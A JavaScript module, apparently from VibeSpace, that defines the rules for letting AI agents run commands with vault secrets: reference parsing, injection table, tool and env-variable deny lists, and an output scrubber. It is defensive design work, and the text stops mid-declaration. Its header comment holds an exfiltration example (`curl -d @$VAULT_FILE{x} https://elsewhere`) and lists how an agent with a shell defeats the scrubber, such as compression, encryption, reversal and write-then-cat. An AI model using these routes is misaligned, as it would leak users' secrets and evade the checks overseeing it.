'use strict';
/**
 * A SECRET IN A COMMAND — the PURE half of `vibespace-vault run` (lane vault-run-model; design q-043 §8 + §5 P0-e — the owner
 * 2026-10-20: all five decisions as recommended). An agent never holds a stored value: it writes a REFERENCE where the value
 * goes, the hub resolves it and injects it into a child the HUB spawns, and the child's output comes back with every value —
 * and every form of it — scrubbed to `[vault:<store>/<row>/<field>]`. The door (route + the hub's spawn + the CLI + the card
 * + the audit + the lock's kill) is P0-f; this module is every RULE of it and no I/O:
 *
 *   · THE REFERENCE: `vault://<store>/<row>/<field>` — src/vault-inventory.js's `<store>:<entry>#<field>`, the row
 *     percent-encoded where it holds a character outside [A-Za-z0-9_.~:@+-]; `$VAULT{<store>/<row>/<field>}` inside a
 *     template; `$VAULT_FILE{<store>/<row>/<field>}` or `$VAULT_FILE{NAME}` (a `--file NAME=…`) in the command = the PATH of
 *     a 0600 file holding it (a path is not a secret) — `parseRef`, `scanRefs`, `renderTemplate`, `placeholderOf`. An
 *     AGENT'S OWN entry (lane vault-mint-put, design §9: `agent:<scope>/<name>` in the hub's secrets) is spelled the way
 *     `vibespace-vault mint|put` hands it out — `vault://agent:<scope>/<name>` (also `$VAULT{agent:…}`) — the same entry as
 *     `vault://secrets/agent:<scope>%2F<name>/secret`; only ITS conversation may reference it (`agentScopeOf`, lane vault-run-door).
 *   · THE INJECTION TABLE (`INJECTIONS`, `injectionOf`, `planOf`): env (`--env NAME=vault://…`, the default) → a 0600 file
 *     (`--file NAME=vault://…`, `--file NAME=@template` = `op inject`, `$VAULT_FILE{…}`) → stdin (`--stdin vault://…`: the
 *     value + a newline); a reference IN ARGV is REFUSED (`argv_refused`: /proc/<pid>/cmdline is readable by every user of
 *     the machine — lane vault-p1-secrets-off-argv's law); `--allow-argv` opens it only for a KNOWN tool marked argv-only
 *     (none today) and the plan says `argvExposed`. The agent's plain env may not name a library the tool loads, code an
 *     interpreter or shell runs first, a program the tool starts, a config it obeys, a proxy or PATH (`env_refused`); its
 *     NAMES are part of the shape.
 *   · THE REFUSAL TABLE (`TOOL_ROWS`, `refusedTool`): a tool (argv[0] resolved on the agent env's PATH, never the cwd — the
 *     door resolves, the resolved path is the shape's tool) that prints, transforms, packs or copies what it reads, records
 *     another process or wraps another tool is refused BY NAME (`tool_prints_secrets` · `tool_wraps_another`); VibeSpace's
 *     own CLIs and the agent browser reach the vault through their own doors (`tool_has_its_own_door`). A shell or an
 *     interpreter is not refused: its whole command line IS the shape, shown verbatim, never «always».
 *   · THE KNOWN TOOLS (`KNOWN_TOOLS`, §8.4): default hosts, where a tool's hosts come from (URLs, scp-like targets, an ssh
 *     target, a host flag, a registry), its subcommand words, whether it honours the proxy env (P1 vault-run-egress fences
 *     on it); a tool outside the table, or one naming no host = destination UNKNOWN (said on the card, never «always»). Lane
 *     vault-agent-own (round 2): a URL tool's target written WITHOUT a scheme (`curl evil.example.com`, httpie's `:3000`), a
 *     libpq connection string's `host=` / `hostaddr=` and a URI's host LIST (`postgresql://a,b/db`), an ATTACHED short flag
 *     (`-hHOST`, `-oProxyCommand=…` — getopt: the first letter that takes a value takes the rest of the word) and gh's
 *     `--hostname` / `-R HOST/OWNER/REPO` are READ as hosts; a target the shape cannot list (a curl glob, a bare number, a URL
 *     it cannot read, curl `--expand-*`) makes the shape BLIND (`unread`).
 *   · THE SHAPE KEY (`shapeOf`, `shapeKeyOf`; decision ④): tool + flags (order-free) + hosts + entries + injection + the
 *     plain env (names AND values — lane vault-run-door: `PGHOST=evil` is another shape) + the templates' text + `--on`; a
 *     known tool's subcommand words belong to the tool, and so do the VALUES of its routing flags (`keyed`: ssh -o / -J /
 *     -F, curl -x / --resolve / --connect-to, git -c, rsync -e); every other positional is a CLASS (<path> <word> <number>
 *     <url> <vaultfile>) — a new file name is the same shape, a new host, flag, entry, route or subcommand is not. «always»
 *     is never offered for a shell, an interpreter, an unknown destination, a tool that runs the project's own code (npm,
 *     pip, docker), a config file the card cannot show (curl -K, ssh -F, kubectl --kubeconfig) or a program an agent could
 *     have written (`programWritable` — the door's fact).
 *   · THE VERDICT (`runVerdict`, §8.3): not set up / locked FIRST; the plan's and the tool's refusals; an entry with its own
 *     door (`OWN_DOORS`) / unknown / not opened for runs / too short to scrub; the conversation's grant; a remembered «always» for
 *     this shape; else a cluster ASKS every time (once / always / deny — the urgent card, 60 s) and a local instance asks the
 *     FIRST time a shape runs and allows it after one 允许 (`seen` — the owner's decision ②; still audited, still scrubbed).
 *   · THE OWN ROAD (lane vault-agent-own — the owner 2026-10-26: 「它自己存的使用为啥还要我的允许？」): an `agent:` entry is runnable by
 *     the conversation that made it BY CONSTRUCTION — no switch, no grant, no card (`ownsAgentEntry`: the entry's scope is that
 *     conversation — its registered id for an entry made before this lane, its DURABLE id, the CLI session id a resumed
 *     conversation keeps, for one made since). Provenance decides ONE thing: a value the agent PUT (it saw it) never asks; a value
 *     the hub MINTED (the agent never saw it) asks ONCE PER HOST when a run names a host other than the one it was minted `--for`
 *     (`awayOf` — the only leak the card can still prevent); a run whose destination cannot be told — a shell, an interpreter,
 *     an unknown tool, a routing flag, a config file, project code, a program an agent could write, and (round 2) a known tool
 *     whose host the table did not read (every row of the table reaches the network: no host read is not «no host») — asks
 *     once per command SHAPE on a local instance and EVERY run on a cluster, where only a live «always» (the second password)
 *     passes it, as for the owner's own entries. Still audited, still scrubbed.
 *   · THE SCRUBBER (`FORMS` / `FORM_ROWS` — THE ONE LIST, each form with a real tool that prints it by itself; `formsOf`,
 *     `VIEWS`, `createRunMasker`, `createMasker`, `maskText`): the value in every spelling a real producer prints becomes its
 *     placeholder. SPELLED (texts built from the value): raw; base64 (standard and URL-safe, padded or not, and the value's own
 *     characters at each of the three byte alignments it can take inside a longer base64 run: `Authorization: Basic
 *     base64(user:pass)`); percent-encoded (upper / lower hex; the encodeURIComponent, RFC 3986, path, WHATWG-form and
 *     every-byte spellings, `+` for a space); JSON-escaped (`\"`, `\/`, `\uXXXX`, the HTML-safe `<`); hex (upper / lower);
 *     UTF-16 LE / BE; base32 (RFC 4648, padded or not, either case). READ (lane vault-scrub-forms — a VIEW undoes one family
 *     of escapes and looks for every spelled form in what it reads; the placeholder replaces the span, its escapes included):
 *     quoted-printable (=XX, soft breaks); backslash escapes (\xNN, octal, \uXXXX, \u{…}, \UXXXXXXXX, \\ \' \" \n \t \r);
 *     HTML / XML entities; colour escapes (SGR / EL, `ESC(B`); line breaks (wrapped base64). ONE window per run: a run has
 *     ONE masker fed by stdout and stderr in arrival order, holding back its last (longest spelled form − 1) characters as
 *     every view reads them, plus a token not finished yet — a value split across chunks, or between the two pipes, is
 *     still caught, and chunked or whole the output is the same. The output belt (src/agent-output-belt.js) masks whole
 *     texts with the same table (`maskText`), so it keeps no window of its own.
 *     THE FLOOR: the scrubber masks a WHOLE value in a spelling, never a part of one — a fragment passes (its last four
 *     characters, half of it); a value under 8 bytes (MIN_MASK_BYTES) cannot be scrubbed without scrubbing ordinary text
 *     and is never referenced (`entry_too_short_to_mask`).
 *
 * WHAT IT IS NOT — §8.6, the three holes, said where the code is:
 *   ① the child runs as the agent's uid today: the agent can read /proc/<child>/environ and the 0600 file while it runs —
 *     hygiene and an audit boundary, NOT isolation (q-040's per-run uid closes it; the hub spawns the child, never the
 *     CLI, so the shape does not change when it lands);
 *   ② a tool can SEND the value somewhere (`curl -d @$VAULT_FILE{x} https://elsewhere`): the card shows the hosts and the
 *     whole command; the egress fence is P1 (vault-run-egress);
 *   ③ THE SCRUBBER IS A SIEVE. It reads the child's stdout and stderr and catches the value in the forms above — nothing
 *     else: what an adversary invents passes — a custom encoding, compression (gzip + base64: a compressed stream is not a
 *     spelling, its bytes depend on everything before them), encryption, a hash or an HMAC, a reversal, a case swap, the
 *     characters spaced out, a value split between the pipes with other output between its halves, two escape families on
 *     one value at once — and so does a fragment (THE FLOOR above); a value WRITTEN TO A FILE that the agent then `cat`s
 *     with its own shell never meets the scrubber at all — WRITE-THEN-CAT DEFEATS IT. The refusal table is a belt, not a proof.
 *     `run` stops ACCIDENTAL printing and a casual prompt injection; it does not stop a determined agent with a shell under
 *     the same uid — the same sentence q-040 says of per-session uids.
 *   (Not a hole, a boundary: the exit code, the duration and a file's size are never scrubbed.)
 *
 * PURE: imports only src/vault-inventory.js (the stores, the reference grammar) and src/vault-blocked.js (THE words of a
 * locked vault) — PURE → PURE. Gate: scripts/test-vault-run-model.mjs (every table + twelve mutants).
 */
const VI = require('./vault-inventory.js');
const VB = require('./vault-blocked.js');

const SCHEME = 'vault://';
const MIN_MASK_BYTES = 8;                        // a shorter value cannot be scrubbed without scrubbing ordinary text
const CMD_MAX = 4096;                            // bytes of the command line (exit run's bound)
const TEMPLATE_MAX = 65536;                      // bytes of one template (its text is part of the shape key)
const TIMEOUT_DEFAULT_S = 120;
const TIMEOUT_MAX_S = 600;
const OUTPUT_MAX_BYTES = 2 * 1024 * 1024;        // per run, the device's bound
const ASK_TTL_MS = 60000;                        // an unanswered card is refused by name (`ask_expired`, exit-proxy askOnce)
const ALWAYS_TTLS = Object.freeze({ '8h': 8 * 3600e3, '30d': 30 * 86400e3, forever: null });
const ALWAYS_DEFAULT = '30d';
const SHAPE_V = 'vr2';                           // a change of the key's spelling bumps it (every stored «always» asks again)
const SHAPE_NOTE = 'this shape = the tool + its flags + the hosts + the entries; positional arguments may change';

// ── THE WORDS (the code is the contract; the sentence is what an agent reads) ──
const WORDS = Object.freeze({
  vault_not_set_up: 'the vault is not set up on this instance — there is nothing to reference',
  vault_locked: VB.agentWords('a run waits until a person unlocks it on this instance\'s page'),
  bad_flag: 'usage: vibespace-vault run [--env NAME=vault://…] [--file NAME=vault://…|@template] [--stdin vault://…] [--allow-argv] [--on <machine>] [--timeout <s>] -- <command…>',
  bad_reference: 'a reference is vault://<store>/<row>/<field> (vibespace-vault list names the ones this conversation may use); in a template $VAULT{<store>/<row>/<field>}, in the command $VAULT_FILE{…} for a file\'s path',
  bad_env_name: 'an env name is letters, digits and _ (not starting with a digit)',
  duplicate_name: 'one NAME, one value — a name given twice is refused',
  env_refused: 'that variable would change what the tool loads, runs, obeys or reaches — refused by name',
  no_command: 'nothing to run — give the command after --',
  cmd_too_long: `the command is longer than ${CMD_MAX} bytes`,
  no_reference: 'the command references nothing in the vault — run it with your own shell',
  template_unread: 'the template was not read (the door hands its text in)',
  template_too_long: `a template is longer than ${TEMPLATE_MAX} bytes`,
  argv_refused: 'a value on the command line is visible to every user of the machine (/proc/<pid>/cmdline): pass it with --env NAME=vault://…, --file NAME=vault://… / $VAULT_FILE{…}, or --stdin vault://…',
  tool_prints_secrets: 'that tool prints, transforms, packs or copies what it reads — refused by name (a value would leave through its output or a file)',
  tool_wraps_another: 'that tool starts another one — run the tool itself (the run has its own timeout)',
  tool_has_its_own_door: 'VibeSpace\'s own CLIs and the agent browser reach the vault through their own doors',
  entry_has_its_own_door: 'that entry is never referenced by a run — it has its own door',
  entry_unknown: 'no such entry (vibespace-vault list names the ones this conversation may use)',
  entry_not_runnable: 'the user has not opened that entry for runs (⚙ System ▸ Vault…: the row\'s «Usable by agent runs», off by default) — ask them for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (a question in their For you tray; nothing waits on it)',
  entry_too_short_to_mask: `that value is shorter than ${MIN_MASK_BYTES} bytes and cannot be scrubbed from the output — it is never referenced`,
  use_not_granted: 'this conversation may not use that entry — ask the user for it with its purpose: vibespace-vault request <vault://…> --for "<why>" (another conversation\'s own entry stays its own)',
  // ── THE DOOR's codes (lane vault-run-door, P0-f — src/server/vault-run-door.js) ──
  job_no_use: 'a Background Work job never runs with a stored secret — run it from the conversation itself',
  device_road_later: 'a run on a paired machine (a remote conversation, --on) is not here yet — a run starts on this instance only',
  cwd_refused: 'a run starts in the conversation\'s project folder, the temp folder or ~/Downloads — cd there first',
  tool_not_found: 'no such program on this instance\'s PATH (a bare name is never looked up in the current folder)',
  template_refused: 'a template is a regular file in the project folder, the temp folder or ~/Downloads',
  ask_pending: 'the same command shape already waits for the user\'s answer — wait for it, then run again',
  ask_denied: 'the user did not allow it — nothing ran',
  ask_expired: 'the user did not answer within 60 s — nothing ran; tell them in the chat, then run it again',
  ask_unfiled: 'the question could not be put in front of the user (For you refused it) — nothing ran; resolve your open For-you items first',
  ask_changed: 'the request changed after it was shown — nothing ran; run it again',
  caller_gone: 'the call went away while it waited — nothing ran',
  too_many_runs: 'too many runs at once — wait for one to end',
  spawn_failed: 'the program could not be started',
});
function refuse(code, extra = {}) { return { ok: false, code, words: WORDS[code] || code, ...extra }; }
const refusalOf = refuse;   // the door's refusals in the same shape (one spelling of a code and its words)

// ── THE REFERENCE ──
const ROW_KEEP = /[^\w.~:@+-]/g;
const encRow = (entry) => String(entry).replace(ROW_KEEP, (c) => encodeURIComponent(c).replace(/[!'()*]/g, (x) => '%' + x.charCodeAt(0).toString(16).toUpperCase()));
const REF_BODY = '([a-z][a-z0-9-]{0,31})/([\\w.~:@+%-]{1,720})/([\\w.:-]{1,160})';
const REF_EXACT = new RegExp(`^${REF_BODY}$`);
const REF_HEAD = new RegExp(`^vault://${REF_BODY}`);
const ENV_NAME = /^[A-Za-z_][A-Za-z0-9_]{0,127}$/;
// lane vault-run-door: an AGENT's own entry (lane vault-mint-put — src/vault.js AGENT_NS_RE: `agent:<scope>/<name>`, the
// secrets store, field `secret`) as its CLI hands it out: `vault://agent:<scope>/<name>`
const AGENT_BODY = 'agent:([A-Za-z0-9._:-]{1,128})/([A-Za-z0-9._-]{1,64})';
const AGENT_EXACT = new RegExp(`^${AGENT_BODY}$`), AGENT_HEAD = new RegExp(`^vault://${AGENT_BODY}`);
const AGENT_ENTRY = /^agent:([A-Za-z0-9._:-]{1,128})\/([A-Za-z0-9._-]{1,64})$/;
const isAgentEntry = (store, entry, field) => store === 'secrets' && field === 'secret' && AGENT_ENTRY.test(String(entry));
// lane vault-paste-request: a FREE entry (`secret:<id>` — the owner pasted it for an agent, or added it in the Vault window):
// opened for runs like a storage credential — the row's switch, a grant (the owner's paste grants the conversation that asked)
const FREE_ENTRY = /^secret:[\w.-]{1,160}$/;
const isFreeEntry = (store, entry, field) => store === 'secrets' && field === 'secret' && FREE_ENTRY.test(String(entry));
function refOf(store, entry, field) {
  const id = VI.refOf(store, entry, field);
  if (!id) return null;
  const label = isAgentEntry(store, entry, field) ? String(entry) : `${store}/${encRow(entry)}/${field}`;   // an agent's own entry: its short spelling
  return Object.freeze({ store, entry, field, id, label, ref: SCHEME + label });
}
function bodyRef(store, row, field) { let entry; try { entry = decodeURIComponent(row); } catch { return null; } return refOf(store, entry, field); }
const agentRef = (scope, name) => refOf('secrets', `agent:${scope}/${name}`, 'secret');
/** A reference's body (after `vault://`, or inside `$VAULT{…}`) → the ref | null. */
function innerRef(body) { const m = REF_EXACT.exec(body); if (m) return bodyRef(m[1], m[2], m[3]); const a = AGENT_EXACT.exec(body); return a ? agentRef(a[1], a[2]) : null; }
/** `vault://<store>/<row>/<field>` or `vault://agent:<scope>/<name>` (the whole string) → { store, entry, field, id, label, ref } | null. */
function parseRef(s) {
  return typeof s === 'string' && s.startsWith(SCHEME) ? innerRef(s.slice(SCHEME.length)) : null;
}
/** An agent's own entry → the conversation that owns it (its scope); any other reference → null. */
const agentScopeOf = (ref) => { const m = ref && ref.store === 'secrets' && ref.field === 'secret' ? AGENT_ENTRY.exec(String(ref.entry)) : null; return m ? m[1] : null; };
const placeholderOf = (ref) => `[vault:${ref && ref.label ? ref.label : String(ref || '')}]`;
/** lane vault-agent-own: is `ref` an agent entry THIS caller made? Its scope is the conversation's registered id (an entry made
 *  before lane vault-agent-own) or its durable id (the CLI session id — kept across a resume; every entry made since): either
 *  spelling of the caller says yes. `caller` = { scope, conv, conversationId }: `conv` is the FORK-SAFE durable id (null for a
 *  pending fork, which borrows its parent's) — when the caller carries it, the raw conversationId is not read. */
const callerIdsOf = (caller) => (caller ? [caller.scope, ...(caller.conv !== undefined ? [caller.conv] : [caller.conversationId])] : []).filter((x) => typeof x === 'string' && x !== '');
function ownsAgentEntry(ref, caller = {}) {
  const sc = agentScopeOf(ref);
  return !!sc && callerIdsOf(caller).includes(sc);
}
/** A mint's `--for <host/service>` → the host it names (lower case — no scheme, user, port or path), or null. A bare word
 *  with no dot (`com`, a service's name) names no host: every host is then «another host» (a suffix must not cover a TLD). */
function forHostOf(s) {
  const m = /^(?:[a-z][a-z0-9+.-]{0,31}:\/\/)?(?:[^@\s\/?#]*@)?(\[[0-9a-f:.]+\]|[a-z0-9.-]+)/.exec(String(s == null ? '' : s).trim().toLowerCase());
  const h = m ? m[1].replace(/\.$/, '') : '';
  return h && h.length <= 253 && /[a-z0-9]/.test(h) && (/\.[a-z0-9-]/.test(h) || h === 'localhost' || h[0] === '[') ? h : null;
}
/** Is a run's `host` (a shape's: `name`, `name:port`, `*.suffix`) the host a value was minted for — or one under it? */
function sameHost(host, forHost) {
  const f = forHostOf(forHost), h = String(host == null ? '' : host).toLowerCase().replace(/:\d+$/, '').replace(/\.$/, '');
  if (!f || !h) return false;
  if (h.startsWith('*.')) { const s = h.slice(2); return f === s || f.endsWith('.' + s); }
  return h === f || h.endsWith('.' + f);
}
/** Every reference-shaped piece of `text` → { refs: [{ …ref, at, len, form: 'url' | 'brace' | 'file', name? }], bad: [{ at, text }] }.
 *  `form` url = `vault://…`; brace = `$VAULT{…}`; file = `$VAULT_FILE{…}` (`name` set when it names a `--file NAME`). A
 *  `vault://` / `$VAULT{` / `$VAULT_FILE{` in any letter case that does not parse is BAD — never read as plain text. */
function scanRefs(text) {
  const s = String(text == null ? '' : text);
  const refs = [], bad = [];
  const re = /vault:\/\/|\$vault(_file)?\{/gi;
  let m;
  while ((m = re.exec(s))) {
    const at = m.index;
    if (m[0][0] !== '$') {
      const h = m[0] === SCHEME ? REF_HEAD.exec(s.slice(at)) : null, ha = !h && m[0] === SCHEME ? AGENT_HEAD.exec(s.slice(at)) : null;
      const r = h ? bodyRef(h[1], h[2], h[3]) : ha ? agentRef(ha[1], ha[2]) : null;
      if (ha && r) { refs.push({ ...r, at, len: ha[0].length, form: 'url' }); re.lastIndex = at + ha[0].length; continue; }
      if (r) { refs.push({ ...r, at, len: h[0].length, form: 'url' }); re.lastIndex = at + h[0].length; } else bad.push({ at, text: s.slice(at, at + 80) });
      continue;
    }
    const file = !!m[1], close = s.indexOf('}', at), inner = close < 0 ? null : s.slice(at + m[0].length, close);
    const exact = m[0] === (file ? '$VAULT_FILE{' : '$VAULT{');
    const named = exact && file && inner != null && ENV_NAME.test(inner);
    const r = exact && inner != null && !named ? innerRef(inner) : null;
    if (named) refs.push({ at, len: close + 1 - at, form: 'file', name: inner });
    else if (r) refs.push({ ...r, at, len: close + 1 - at, form: file ? 'file' : 'brace' });
    else { bad.push({ at, text: s.slice(at, at + 80) }); continue; }
    re.lastIndex = close + 1;
  }
  return { refs, bad };
}
/** A template's `$VAULT{…}` rendered with `valueOf(ref)` (the door's last step — `op inject`). */
function renderTemplate(text, valueOf) {
  const s = String(text == null ? '' : text), { refs } = scanRefs(s);
  let out = '', i = 0;
  for (const r of refs) { if (r.form !== 'brace') continue; out += s.slice(i, r.at) + String(valueOf(r.ref)); i = r.at + r.len; }
  return out + s.slice(i);
}

// ── THE INJECTION TABLE (the order is the preference) ──
const INJECTIONS = Object.freeze([
  Object.freeze({ where: 'env', flag: '--env NAME=vault://…', open: true, seen: 'the child\'s environment (/proc/<pid>/environ — its own uid)', use: 'the default: a tool that reads a token from a variable (GH_TOKEN, PGPASSWORD, AWS_SECRET_ACCESS_KEY)' }),
  Object.freeze({ where: 'file', flag: '--file NAME=vault://… · --file NAME=@template · $VAULT_FILE{…}', open: true, seen: 'a 0600 file in a 0700 run directory, shredded when the child exits', use: 'a tool that reads only a file (curl -K, .npmrc, kubeconfig, my.cnf, ssh -i)' }),
  Object.freeze({ where: 'stdin', flag: '--stdin vault://…', open: true, seen: 'the child\'s stdin (the value + a newline)', use: 'docker login --password-stdin, gh auth login --with-token' }),
  Object.freeze({ where: 'argv', flag: '--allow-argv', open: false, seen: '/proc/<pid>/cmdline — every user of the machine', use: 'refused by default; --allow-argv opens it for a known argv-only tool only (audited argvExposed, a red line on the card)' }),
]);
/** → { ok, where, argvExposed } | refusal. `row` = the tool's KNOWN_TOOLS row. */
function injectionOf(where, { allowArgv = false, row = null } = {}) {
  const r = INJECTIONS.find((x) => x.where === where);
  if (!r) return refuse('bad_flag');
  if (r.open) return { ok: true, where, argvExposed: false };
  const argvOpen = !!allowArgv && !!(row && row.argvOnly);
  return argvOpen ? { ok: true, where, argvExposed: true } : refuse('argv_refused', { why: allowArgv ? 'not an argv-only tool' : 'refused by default' });
}

// ── THE PLAIN ENV an agent may not set (a belt: its NAMES are in the shape too) ──
const ENV_HIJACK = Object.freeze([
  Object.freeze({ re: /^(?:LD_\w*|DYLD_\w*)$/, why: 'the loader would load a library into the tool' }),
  Object.freeze({ re: /^(?:NODE_OPTIONS|NODE_PATH|PYTHONSTARTUP|PYTHONPATH|PYTHONHOME|PYTHONUSERBASE|PERL5OPT|PERL5LIB|PERLLIB|RUBYOPT|RUBYLIB|JAVA_TOOL_OPTIONS|_JAVA_OPTIONS|JDK_JAVA_OPTIONS)$/, why: 'an interpreter would run other code first' }),
  Object.freeze({ re: /^(?:BASH_ENV|ENV|SHELLOPTS|BASHOPTS|PROMPT_COMMAND|PS4|IFS|ZDOTDIR|BASH_FUNC_\S*)$/, why: 'a shell would run other code first' }),
  Object.freeze({ re: /^(?:GIT_SSH|GIT_SSH_COMMAND|GIT_EXEC_PATH|GIT_ASKPASS|SSH_ASKPASS|GIT_PROXY_COMMAND|GIT_CONFIG\w*|EDITOR|VISUAL|PAGER|GIT_PAGER|GIT_EDITOR|MANPAGER|BROWSER|RSYNC_RSH|RSYNC_CONNECT_PROG)$/, why: 'the tool would start a program it names' }),
  Object.freeze({ re: /^PATH$/, why: 'the tool was resolved on the agent\'s PATH; another would change what it starts' }),
]);
const ENV_CONFIG = Object.freeze([   // a plain value pointing at the agent's own file is refused; a `--file NAME=…` the hub renders is not
  Object.freeze({ re: /^(?:KUBECONFIG|CURL_HOME|WGETRC|DOCKER_CONFIG|AWS_CONFIG_FILE|AWS_SHARED_CREDENTIALS_FILE|NPM_CONFIG_USERCONFIG|PIP_CONFIG_FILE|PGSERVICEFILE|PGPASSFILE|PGSYSCONFDIR|PSQLRC|RCLONE_CONFIG|HTTPIE_CONFIG_DIR|GH_CONFIG_DIR|MYSQL_HOME|NETRC)$/i, why: 'it points the tool at a config it obeys' }),   // round 2: PSQLRC (its `\!` runs a shell)
  Object.freeze({ re: /^(?:HOME|XDG_CONFIG_HOME|XDG_DATA_HOME|XDG_CACHE_HOME)$/, why: 'it moves the home a tool reads its config from' }),   // lane vault-run-door (the security review)
  Object.freeze({ re: /^(?:https?_proxy|all_proxy|no_proxy|ftp_proxy)$/i, why: 'where a run may go is the hub\'s (vault-run-egress)' }),
]);
/** NAME → why it is refused, or null. `as` = 'plain' | 'env' (a value) | 'file' (a path the hub renders). */
function envRefusedOf(name, as = 'plain') {
  const n = String(name || '');
  const h = ENV_HIJACK.find((r) => r.re.test(n));
  if (h) return h.why;
  const c = as === 'file' ? null : ENV_CONFIG.find((r) => r.re.test(n));
  return c ? c.why : null;
}

// ── THE REFUSAL TABLE (argv[0], resolved) ──
const TOOL_ROWS = Object.freeze([
  Object.freeze({ cls: 'print', code: 'tool_prints_secrets', names: ['echo', 'printf', 'cat', 'tac', 'nl', 'tee', 'head', 'tail', 'less', 'more', 'most', 'pg', 'bat', 'batcat', 'view', 'env', 'printenv', 'export', 'set', 'declare', 'typeset', 'readonly', 'strings', 'column', 'pr', 'fmt', 'jq', 'yq', 'grep', 'egrep', 'fgrep', 'rg', 'ag', 'diff', 'cmp', 'sort', 'uniq', 'look', 'zcat', 'bzcat', 'xzcat', 'zstdcat', 'lz4cat', 'zless', 'zmore', 'vi', 'vim', 'nvim', 'nano', 'emacs', 'ed', 'ex', 'pico', 'micro'] }),
  Object.freeze({ cls: 'transform', code: 'tool_prints_secrets', names: ['xxd', 'od', 'hexdump', 'hd', 'base64', 'base32', 'basenc', 'uuencode', 'uudecode', 'rev', 'tr', 'cut', 'fold', 'paste', 'sed', 'gsed', 'awk', 'gawk', 'mawk', 'nawk', 'iconv', 'recode', 'md5sum', 'sha1sum', 'sha224sum', 'sha256sum', 'sha384sum', 'sha512sum', 'b2sum', 'cksum', 'sum', 'shasum'] }),
  Object.freeze({ cls: 'pack', code: 'tool_prints_secrets', names: ['gzip', 'gunzip', 'bzip2', 'bunzip2', 'xz', 'unxz', 'lzma', 'unlzma', 'zstd', 'unzstd', 'lz4', 'zip', 'unzip', 'tar', '7z', '7za', '7zr', 'rar', 'unrar', 'cpio', 'ar', 'pax', 'openssl', 'gpg', 'gpg2', 'age'] }),
  Object.freeze({ cls: 'copy', code: 'tool_prints_secrets', names: ['cp', 'mv', 'dd', 'install', 'ln', 'link', 'split', 'csplit'] }),
  Object.freeze({ cls: 'trace', code: 'tool_prints_secrets', names: ['strace', 'ltrace', 'gdb', 'lldb', 'perf', 'valgrind', 'bpftrace', 'script'] }),
  Object.freeze({ cls: 'wrapper', code: 'tool_wraps_another', names: ['sudo', 'doas', 'su', 'runuser', 'sg', 'newgrp', 'nice', 'ionice', 'nohup', 'timeout', 'time', 'stdbuf', 'setsid', 'xargs', 'parallel', 'watch', 'flock', 'chroot', 'unshare', 'nsenter', 'busybox', 'toybox', 'command', 'exec', 'builtin', 'eval', 'taskset', 'chrt', 'systemd-run', 'firejail', 'bwrap', 'proot', 'fakeroot'] }),
  Object.freeze({ cls: 'door', code: 'tool_has_its_own_door', names: ['agent-browser'], prefix: 'vibespace-' }),
]);
const REFUSING = TOOL_ROWS;
const SHELLS = Object.freeze(['sh', 'bash', 'zsh', 'dash', 'ksh', 'mksh', 'ash', 'fish', 'csh', 'tcsh', 'pwsh', 'powershell', 'cmd']);
const INTERPRETERS = Object.freeze(['node', 'nodejs', 'deno', 'bun', 'python', 'pypy', 'perl', 'ruby', 'php', 'lua', 'luajit', 'tclsh', 'wish', 'rscript', 'julia', 'java', 'dotnet']);   // a Mac's interpreters come with the device road (P1 vault-run-device)

// ── THE KNOWN TOOLS (§8.4 — P1 vault-run-egress fences the `proxyEnv` ones) ──
const SSH_VALUE_FLAGS = ['-b', '-c', '-D', '-E', '-e', '-F', '-I', '-i', '-J', '-L', '-l', '-m', '-O', '-o', '-p', '-P', '-Q', '-R', '-S', '-W', '-w', '-B'];
const SSH_KEYED = ['-o', '-F', '-J', '-W', '-L', '-R', '-D', '-S'];   // lane vault-run-door: where the connection goes / what it runs (ProxyCommand) — the value is the shape
// lane vault-agent-own (round 2): the flags whose VALUE is the next word, so a value is never read as a target (`curl -X POST`,
// `wget -O out.html`); a flag missing here only makes its value look like a target — a card more, never one less
const CURL_VALUE_FLAGS = ['-A', '--user-agent', '-b', '--cookie', '-c', '--cookie-jar', '-C', '--continue-at', '-d', '--data', '--data-ascii', '--data-binary', '--data-raw', '--data-urlencode', '--json', '-D', '--dump-header', '-e', '--referer', '-E', '--cert', '--cert-type', '--key', '--key-type', '--cacert', '--capath', '--ciphers', '-F', '--form', '--form-string', '-H', '--header', '-m', '--max-time', '--connect-timeout', '-o', '--output', '--output-dir', '-r', '--range', '-T', '--upload-file', '-u', '--user', '-U', '--proxy-user', '-w', '--write-out', '-X', '--request', '-y', '--speed-time', '-Y', '--speed-limit', '-z', '--time-cond', '--retry', '--retry-delay', '--retry-max-time', '--limit-rate', '--max-filesize', '--max-redirs', '--oauth2-bearer', '--aws-sigv4', '--interface', '--local-port', '-Q', '--quote', '--stderr', '--trace', '--trace-ascii', '--pinnedpubkey', '--pass', '--proto', '--proto-redir', '--variable', '--url-query', '--url', '--unix-socket', '--abstract-unix-socket', '--dns-servers', '--netrc-file', '--hsts', '--etag-save', '--etag-compare'];
const WGET_VALUE_FLAGS = ['-O', '--output-document', '-o', '--output-file', '-a', '--append-output', '-P', '--directory-prefix', '-U', '--user-agent', '--header', '--user', '--password', '--http-user', '--http-password', '--post-data', '--post-file', '--body-data', '--body-file', '--method', '-t', '--tries', '-T', '--timeout', '--load-cookies', '--save-cookies', '--ca-certificate', '--certificate', '--private-key', '-w', '--wait', '-Q', '--quota', '--limit-rate', '-l', '--level', '-A', '--accept', '-R', '--reject', '-D', '--domains', '--exclude-domains', '-e', '--execute', '-B', '--base', '--bind-address', '--config', '-i', '--input-file'];
const HTTPIE_VALUE_FLAGS = ['-a', '--auth', '-A', '--auth-type', '-o', '--output', '--session', '--session-read-only', '--cert', '--cert-key', '--cert-key-pass', '--ciphers', '--ssl', '--timeout', '--max-redirects', '--boundary', '--format-options', '-p', '--print', '-P', '--history-print', '--pretty', '-s', '--style', '--response-charset', '--response-mime', '--default-scheme', '--verify', '--proxy', '--raw'];
const KNOWN_TOOLS = Object.freeze([
